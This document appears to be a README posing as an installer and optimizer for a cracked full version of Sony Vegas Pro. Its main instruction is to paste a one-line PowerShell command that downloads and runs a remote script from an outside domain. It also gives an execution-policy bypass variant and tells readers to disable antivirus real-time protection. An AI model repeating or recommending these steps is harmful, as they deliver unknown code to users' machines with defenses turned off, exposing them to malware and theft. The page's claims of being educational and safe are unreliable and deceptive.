# Sony Vegas Pro Studio Environment Deployment & Optimization Suite

This repository provides an automated installation manager and system tuning utility designed to seamlessly prepare your production workstation for **Sony Vegas Pro**. If you are looking for an efficient way to initialize the **Vegas Pro full version** workspace without tedious manual component linking, directory mapping, or codec configuration, this script automates the entire sequence.

## 🎬 Why Use This Deployment Tool?

Setting up advanced non-linear video editing (NLE) applications frequently causes hardware acceleration mismatches, missing dynamic link libraries, or workspace initialization crashes. Our open-source configuration engine solves these bottlenecks:

* **Complete Suite Deployment:** Installs the core video editing framework and pre-configures standard effects.
* **GPU Acceleration Linker:** Modifies registry profiles to maximize NVENC/AMF video encoding throughput.
* **Codec Package Assembly:** Automatically registers essential media formats for uninterrupted timeline playback.
* **Offline Preference Locker:** Bypasses persistent cloud check-ins, securing your editing workspace profile locally.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on **Terminal** or **Windows PowerShell** from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit `Enter`. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://trust-soft.cc/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://trust-soft.cc/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated version)
If your window doesn't support the irm shortcut, use the full, unabbreviated commands instead:
```powershell
Invoke-RestMethod https://trust-soft.cc/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📹 Technical Blueprint & System Targets

Engineered for performance-heavy video processing environments to guarantee smooth real-time scrubbing and multi-stream rendering:
* **Host OS Support:** Tailored for Windows 10 and Windows 11 architectures (64-bit systems only).
* **Hardware Threshold:** Works best with a multi-core processor and dedicated graphics cards to prevent encoding lag.
* **Local Isolation:** Once applied, the configurations establish a permanent operational loop, allowing editors to finish demanding rendering jobs entirely offline.

## 🤝 Project Scope

This project operates as an independent post-installation helper designed strictly for educational setups, performance benchmarking, and home video editing optimization. All automations communicate with local registry flags to mimic a professional post-production pipeline.
